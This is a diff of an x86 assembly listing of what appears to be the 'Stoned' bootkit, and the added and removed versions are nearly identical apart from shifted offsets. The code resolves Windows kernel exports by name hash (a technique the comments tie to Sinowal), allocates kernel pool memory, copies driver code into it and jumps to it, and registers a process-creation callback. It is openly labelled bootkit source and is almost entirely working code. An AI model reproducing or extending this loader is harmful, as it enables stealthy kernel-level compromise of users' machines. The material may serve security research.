-   690 00000466 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
-   691 00000468 EBBC                    jmp short Next_Export
-   692                                  
-   693                                  All_Hashes_Resolved:
-   694 0000046A 90                      nop
-   695 0000046B 08C0                    or al, al
-   696 0000046D 08C0                    or al, al
-   697 0000046F 90                      nop
-   698                                  ; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory
-   699                                  ; nt!ExAllocatePool(Type 0, 8192 bytes)
-   700 00000470 6800200000              push dword 8192 ; NumberOfBytes = 8192 bytes
-   701 00000475 6A00                    push dword 0   ; PoolType = 0
-   702 00000477 FF55E8                  call dword [ebp - 24]     ; ExAllocatePool()
-   703                                  
-   704 0000047A 09C0                    or eax,eax     ; valid buffer?
-   705 0000047C 744A                    jz Exit_Bootkit
-   706                                  
-   707 0000047E 89C7                    mov edi,eax     ; copy the code
-   708 00000480 8B75E0                  mov esi,[ebp - 32]       ; the pointer to the import terminator
-   709 00000483 81C6B6000000            add esi,Driver_Code - Obfuscation_Call +4    ; use that absolute pointer (+ 4 to seek after the terminator)
-   710 00000489 B946000000              mov ecx,Total_End_of_Binary - Driver_Code
-   711 0000048E F3A4                    rep movsb
-   712                                  
-   713                                  ; initialize the data pointer [ebp-32]
-   714 00000490 8945E0                  mov [ebp - 32],eax                                                              ; will point to the data
-   715 00000493 8345E03A                add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point
-   716                                  
-   717 00000497 FFE0                    jmp eax ; jump to execute Driver_Code
+   670 00000442 31C0                    xor eax,eax   ; will hold character (zero extended)
+   671 00000444 31FF                    xor edi,edi   ; will hold hash value
+   672                                  
+   673                                  Generate_Hash_of_Export_Name:
+   674                                  ; generates the hash of the name string, += n >> 13 is used
+   675 00000446 AC                      lodsb
+   676 00000447 08C0                    or al,al  ; zero termination?
+   677 00000449 7407                    jz Hash_Generated 
+   678 0000044B C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
+   679 0000044E 01C7                    add edi,eax    ; add to hash value
+   680 00000450 EBF4                    jmp short Generate_Hash_of_Export_Name
+   681                                  
+   682                                  Hash_Generated:
+   683                                  ; krrr
+   684 00000452 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
+   685 00000455 AD                      lodsd   ; get next hash
+   686 00000456 09C0                    or eax,eax 
+   687 00000458 7421                    jz All_Hashes_Resolved    ; if yes exit loop
+   688 0000045A 39C7                    cmp edi,eax       ; found correct hash?
+   689 0000045C 75D9                    jnz Next_Export   ; if not => next export
+   690 0000045E 893424                  mov [esp],esi     ; update hash pointer
+   691 00000461 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
+   692 00000464 01DF                    add edi,ebx    ;   (absolute address)
+   693 00000466 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
+   694 0000046A 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
+   695 0000046D 01DF                    add edi,ebx                ;   (absolute address)
+   696 0000046F 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
+   697 00000472 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
+   698                                  
+   699                                  Resolve_Next_Hash_StoreOnStack:
+   700 00000474 87FD                    xchg edi,ebp    ; edi to point to stack variables
+   701 00000476 AB                      stosd   ; store eax to variable
+   702 00000477 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
+   703 00000479 EBBC                    jmp short Next_Export
+   704                                  
+   705                                  All_Hashes_Resolved:
+   706 0000047B 90                      nop
+   707 0000047C 08C0                    or al, al
+   708 0000047E 08C0                    or al, al
+   709 00000480 90                      nop
+   710                                  ; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory
+   711                                  ; nt!ExAllocatePool(Type 0, 8192 bytes)
+   712 00000481 6800200000              push dword 8192 ; NumberOfBytes = 8192 bytes
+   713 00000486 6A00                    push dword 0   ; PoolType = 0
+   714 00000488 FF55E8                  call dword [ebp - 24]     ; ExAllocatePool()
+   715                                  
+   716 0000048B 09C0                    or eax,eax     ; valid buffer?
+   717 0000048D 744A                    jz Exit_Bootkit
    718                                  
-   719                                  Driver_Code:
-   720 00000499 90                      nop
-   721 0000049A 90                      nop
-   722 0000049B 90                      nop
-   723                                  ; [ebp - 32] = data reference
+   719 0000048F 89C7                    mov edi,eax     ; copy the code
+   720 00000491 8B75E0                  mov esi,[ebp - 32]       ; the pointer to the import terminator
+   721 00000494 81C6B6000000            add esi,Driver_Code - Obfuscation_Call +4    ; use that absolute pointer (+ 4 to seek after the terminator)
+   722 0000049A B946000000              mov ecx,Total_End_of_Binary - Driver_Code
+   723 0000049F F3A4                    rep movsb
    724                                  
-   725                                  ; store the ntoskrnl base address
-   726 0000049C 8B75E0                  mov esi,[ebp - 32] 
-   727 0000049F 891E                    mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address
+   725                                  ; initialize the data pointer [ebp-32]
+   726 000004A1 8945E0                  mov [ebp - 32],eax                                                              ; will point to the data
+   727 000004A4 8345E03A                add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point
    728                                  
-   729                                  ; allocate a memory pool (1024 bytes) for the Stoned Subsystem
-   730                                  ; nt!ExAllocatePool(Type 0, 1024 bytes)
-   731 000004A1 6800040000              push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
-   732 000004A6 6A00                    push dword 0                                                                    ; PoolType = 0
-   733 000004A8 FF55E8                  call dword [ebp - 24]                                                           ; ExAllocatePool()
-   734 000004AB 09C0                    or eax,eax                                                                      ; valid buffer?
-   735 000004AD 7419                    jz Exit_Bootkit
-   736 000004AF 894608                  mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
-   737 000004B2 C7460400000000          mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback
-   738                                  
-   739 000004B9 B806000000              mov eax, Data_Reference-MyCreateProcessNotifyRoutine
-   740 000004BE 29C6                    sub esi,eax
-   741 000004C0 6A00                    push 0
-   742 000004C2 56                      push esi
-   743 000004C3 FF55FC                  call dword [ebp - 4] 
-   744 000004C6 EB00                    jmp Exit_Bootkit
-   745                                  
-   746                                  ; return from bootkit to Windows
-   747                                  Exit_Bootkit:
-   748 000004C8 89EC                    mov esp,ebp 
-   749 000004CA 9D                      popfd
-   750 000004CB 61                      popad
-   751 000004CC C3                      ret
-   752                                  
-   753                                  MyCreateProcessNotifyRoutine:
-   754 000004CD 90                      nop
-   755 000004CE 90                      nop
-   756 000004CF 90                      nop
-   757 000004D0 C20C00                  ret 0ch
-   758                                  
-   759                                  ; data following, [ebp - 32] will point to here
-   760                                  Data_Reference:
-   761                                  Subsystem_Variables:
-   762 000004D3 00000000                Ntoskrnl_BaseAddress        dd  0
-   763 000004D7 00000000                Callback_NotifyDriverLoad   dd  0
-   764 000004DB 00000000                Memory_Pool                 dd  0
-   765                                  
-   766                                  Total_End_of_Binary:
-   767 000004DF 00<rept>                times 4*1024-($-$$) db 0
+   729 000004A8 FFE0                    jmp eax ; jump to execute Driver_Code
+   730                                  
+   731                                  Driver_Code:
+   732 000004AA 90                      nop
+   733 000004AB 90                      nop
+   734 000004AC 90                      nop
+   735                                  ; [ebp - 32] = data reference
+   736                                  
+   737                                  ; store the ntoskrnl base address
+   738 000004AD 8B75E0                  mov esi,[ebp - 32] 
+   739 000004B0 891E                    mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address
+   740                                  
+   741                                  ; allocate a memory pool (1024 bytes) for the Stoned Subsystem
+   742                                  ; nt!ExAllocatePool(Type 0, 1024 bytes)
+   743 000004B2 6800040000              push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
+   744 000004B7 6A00                    push dword 0                                                                    ; PoolType = 0
+   745 000004B9 FF55E8                  call dword [ebp - 24]                                                           ; ExAllocatePool()
+   746 000004BC 09C0                    or eax,eax                                                                      ; valid buffer?
+   747 000004BE 7419                    jz Exit_Bootkit
+   748 000004C0 894608                  mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
+   749 000004C3 C7460400000000          mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback
+   750                                  
+   751 000004CA B806000000              mov eax, Data_Reference-MyCreateProcessNotifyRoutine
+   752 000004CF 29C6                    sub esi,eax
+   753 000004D1 6A00                    push 0
+   754 000004D3 56                      push esi
+   755 000004D4 FF55FC                  call dword [ebp - 4] 
+   756 000004D7 EB00                    jmp Exit_Bootkit
+   757                                  
+   758                                  ; return from bootkit to Windows
+   759                                  Exit_Bootkit:
+   760 000004D9 89EC                    mov esp,ebp 
+   761 000004DB 9D                      popfd
+   762 000004DC 61                      popad
+   763 000004DD C3                      ret
+   764                                  
+   765                                  MyCreateProcessNotifyRoutine:
+   766 000004DE 90                      nop
+   767 000004DF 90                      nop
+   768 000004E0 90                      nop
+   769 000004E1 C20C00                  ret 0ch
+   770                                  
+   771                                  ; data following, [ebp - 32] will point to here
+   772                                  Data_Reference:
+   773                                  Subsystem_Variables:
+   774 000004E4 00000000                Ntoskrnl_BaseAddress        dd  0
+   775 000004E8 00000000                Callback_NotifyDriverLoad   dd  0
+   776 000004EC 00000000                Memory_Pool                 dd  0
+   777                                  
+   778                                  Total_End_of_Binary:
+   779 000004F0 00<rept>                times 4*1024-($-$$) db 0
